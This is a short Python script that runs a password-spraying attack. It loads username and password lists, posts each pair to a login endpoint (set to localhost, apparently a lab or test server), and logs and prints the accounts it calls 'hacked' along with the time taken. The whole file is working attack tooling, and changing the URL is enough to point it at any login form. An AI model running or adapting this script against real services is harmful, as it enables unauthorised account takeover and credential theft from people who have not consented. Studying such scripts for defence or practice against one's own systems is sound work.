import requests
import time

#------------------------ Parameters -------------------------#
URL = "http://localhost:8000/login"
usersFile = "users.txt"
passwordsFile = "passwords.txt"
logFile = "log.txt"

#------------------------ Vars -------------------------#
hackedUsers = {}
start = time.time()

session = requests.Session()   

#------------------------- Functions --------------------------#
def try_login(username, password):
    payload = {
        "username": username,
        "password": password
    }

    response = session.post(URL, json=payload) #send credential to server

    if response.status_code == 200: #success
        elapsed = time.time() - start #calc how much time req to hack that user
        hackedUsers[username] = (password, elapsed) #add to list

        with open(logFile, "a") as f: #write to log file
            f.write(f"{username:<40} {password:<40} {elapsed:<40.2f}\n")


#------------------------- Main --------------------------#

# -------- load files data to memory -------- #

with open(usersFile) as f:
    users = [line.strip() for line in f]

with open(passwordsFile) as f:
    passwords = [line.strip() for line in f]

# -------- Create Log -------- #
with open(logFile, "w") as f:
    f.write(f"{'Username':<40} {'Password':<40} {'Time (s)':<40}\n")
    f.write("-" * 120 + "\n")


# -------- Password Spraying -------- #
for password in passwords:
    for username in users:
        if username not in hackedUsers:
            try_login(username, password)

# -------- Printing Resaults -------- #
print(f"\n{'Username':<40} {'Password':<40} {'Time':<40}")
print("-" * 120)
for username, (password, t) in hackedUsers.items():
    print(f"{username:<40} {password:<40} {t:<40.2f}")
